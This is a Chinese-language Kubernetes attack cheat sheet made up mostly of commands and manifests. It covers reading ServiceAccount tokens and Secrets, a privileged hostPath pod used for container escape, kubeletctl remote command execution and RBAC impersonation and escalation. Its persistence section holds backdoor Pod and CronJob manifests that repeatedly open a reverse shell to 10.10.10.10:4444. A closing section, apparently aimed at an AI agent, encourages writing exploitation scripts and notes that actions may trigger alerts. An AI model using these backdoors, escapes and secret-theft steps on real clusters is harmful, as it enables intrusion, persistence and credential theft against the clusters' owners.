# Kubernetes 安全

Kubernetes (K8s) 是容器编排平台，其安全测试涉及API服务器、Pod、RBAC等多个组件。

## 信息收集

### 集群信息
```bash
# 集群信息
kubectl cluster-info
kubectl version

# 节点信息
kubectl get nodes
kubectl describe node <node-name>

# 命名空间
kubectl get namespaces
```

### ServiceAccount Token
```bash
# 查看 Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 查看 CA 证书
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 查看命名空间
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### 枚举资源
```bash
# Pods
kubectl get pods --all-namespaces

# Services
kubectl get services --all-namespaces

# Secrets
kubectl get secrets --all-namespaces

# ConfigMaps
kubectl get configmaps --all-namespaces

# ServiceAccounts
kubectl get serviceaccounts --all-namespaces
```

## API 服务器攻击

### 未授权访问
```bash
# 测试匿名访问
curl -k https://<api-server>:6443/api/v1/namespaces

# 使用 Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces
```

### 权限枚举
```bash
# 检查当前权限
kubectl auth can-i --list

# 检查特定权限
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create pods --as system:serviceaccount:default:default
```

### RBAC 绕过
```bash
# 查看 RoleBindings
kubectl get rolebindings --all-namespaces
kubectl get clusterrolebindings

# 查看 Roles
kubectl get roles --all-namespaces
kubectl get clusterroles

# 描述 Role
kubectl describe role <role-name> -n <namespace>
kubectl describe clusterrole <role-name>
```

## Pod 攻击

### 特权 Pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: shell
    image: ubuntu
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

### hostPath 挂载
```yaml
volumeMounts:
- name: host-root
  mountPath: /host
volumes:
- name: host-root
  hostPath:
    path: /
    type: Directory
```

### 容器逃逸
```bash
# 从特权 Pod 访问宿主机
kubectl exec -it privileged-pod -- /bin/bash
chroot /host /bin/bash
```

## Secrets 窃取

### 读取 Secrets
```bash
# 列出 Secrets
kubectl get secrets --all-namespaces

# 获取 Secret 内容
kubectl get secret <secret-name> -o yaml
kubectl get secret <secret-name> -o jsonpath='{.data.password}' | base64 -d

# 从 Pod 中读取
kubectl exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 环境变量
```bash
# 查看 Pod 环境变量
kubectl exec <pod-name> -- env

# 查看 ConfigMap
kubectl get configmap <name> -o yaml
```

## 持久化

### 恶意 Pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
spec:
  containers:
  - name: backdoor
    image: ubuntu
    command: ["/bin/bash"]
    args: ["-c", "while true; do bash -i >& /dev/tcp/10.10.10.10/4444 0>&1; sleep 60; done"]
  restartPolicy: Always
```

### CronJob
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backdoor
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: backdoor
            image: ubuntu
            command: ["/bin/bash"]
            args: ["-c", "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"]
          restartPolicy: OnFailure
```

### DaemonSet
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor
spec:
  selector:
    matchLabels:
      name: backdoor
  template:
    metadata:
      labels:
        name: backdoor
    spec:
      containers:
      - name: backdoor
        image: ubuntu
        command: ["/bin/bash"]
        args: ["-c", "sleep 3600"]
```

## 横向移动

### Pod 到 Pod
```bash
# 网络扫描
nmap -sn 10.0.0.0/8

# 服务发现
kubectl get services --all-namespaces

# 访问其他 Pod
curl http://<service-name>.<namespace>.svc.cluster.local
```

### Pod 到节点
```bash
# 从特权 Pod
kubectl exec -it privileged-pod -- /bin/bash
chroot /host /bin/bash

# SSH 到节点
ssh user@<node-ip>
```

## 自动化工具

### kube-hunter
```bash
# 扫描集群
kube-hunter --remote <api-server>

# 从 Pod 内扫描
kube-hunter --pod
```

### kubeletctl
```bash
# 枚举 Kubelet
kubeletctl scan --cidr 10.0.0.0/8

# 执行命令
kubeletctl exec "whoami" -s <node-ip>

# 读取 Token
kubeletctl scan rce --cidr 10.0.0.0/8
```

### kubectl-who-can
```bash
# 查看谁可以执行操作
kubectl-who-can create pods
kubectl-who-can get secrets --all-namespaces
```

### kubeaudit
```bash
# 安全审计
kubeaudit all
kubeaudit privileged
kubeaudit hostns
```

## 防御绕过

### RBAC 绕过
```bash
# 利用 impersonate 权限
kubectl --as=system:serviceaccount:kube-system:default get secrets

# 利用 escalate 权限
kubectl create rolebinding admin --clusterrole=admin --serviceaccount=default:default
```

### Admission Controller 绕过
```bash
# 测试 Pod Security Policy
kubectl auth can-i use podsecuritypolicy/privileged

# 绕过限制
# 使用允许的 ServiceAccount
```

---

**AI 发挥空间**：
- 根据K8s配置选择合适的测试方法
- 识别RBAC和安全策略问题
- 开发自动化枚举和利用脚本
- 分析集群权限和网络策略

**反幻觉提示**：
- 不要假设所有K8s资源都可访问
- 验证ServiceAccount的实际权限
- 测试操作的实际效果
- 注意K8s操作可能触发告警
- 某些操作可能需要特定的RBAC权限
